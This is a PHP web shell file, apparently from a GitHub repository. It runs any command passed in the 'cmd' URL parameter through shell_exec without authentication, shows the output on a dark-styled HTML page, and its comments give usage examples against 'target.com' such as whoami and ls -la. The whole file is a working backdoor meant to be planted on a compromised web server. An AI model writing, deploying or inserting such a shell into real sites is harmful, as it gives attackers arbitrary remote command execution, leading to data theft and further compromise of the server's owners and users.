<?php
// AUTHOR : MatrixTM26
// GITHUB : https://github.com/MarrixTM26

// basic in-url cmd input
// example of usage:
//     - https://target.com/basic.php?cmd=<command here>
//     - https://target.com/basic.php?cmd=whoami
//     - https://target.com/basic.php?cmd=ls -la ~/

if (isset($_GET["cmd"])) {
    $cmd = $_GET["cmd"];
    $output = shell_exec($cmd);
}
// simple html template to make output look beautifull and easy to read.
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title>basic webshell with inurl cmd</title>
	<style type="text/css" media="all">
		* {
			box-sizing: border-box;
			padding: 0;
			margin: 0;
		}
		
		body {
			margin: 0;
			padding: 0;
			position: relative;
			display: flex;
			flex-direction: column;
			justify-content: center;
			align-items: center;
			min-height: 100vh;
			overflow-x: hidden;
		}
		
		.container {
			background: #000000;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center;
			margin: 0;
			gap: 1rem;
			padding: 1rem;
			position: relative;
			display: flex;
			flex-direction: column;
			justify-content: left;
			align-items: left;
			min-height: 100vh;
			min-width: 100vw;
			max-width: 100vw;
			overflow-x: hidden;
		}
		
		h2 {
			font-family: "Helvetica";
			font-size: 1.5rem;
			color: #900000;
			text-align: left;
		}
		
		p {
			font-family: "Helvetica";
			font-size: 1rem;
			color: #ffffff;
			text-align: left;
		}
		
		.output {
			background: #1a1a1a;
			background-size: cover;
			background-repeat: no-repeat;
			background-position: center;
			margin: 0;
			gap: 1rem;
			padding: 1rem;
			border: 1px solid #ffffff;
		}
	</style>
</head>
<body>
	<div class="container">
		<h2>simple webshell with inurl command</h2>
		<hr />
		<h2>cmd input &darr;</h2>
		<?php if (!empty($cmd)): ?>
        	<p class="output">
            	<?php echo htmlspecialchars($cmd); ?>
        	</p>
    	<?php endif; ?>
		<hr />
		<h2>cmd output &darr;</h2>
		<?php if (!empty($output)): ?>
        	<p class="output">
            	<?php echo htmlspecialchars($output); ?>
        	</p>
    	<?php endif; ?>
	</div>
</body>
</html>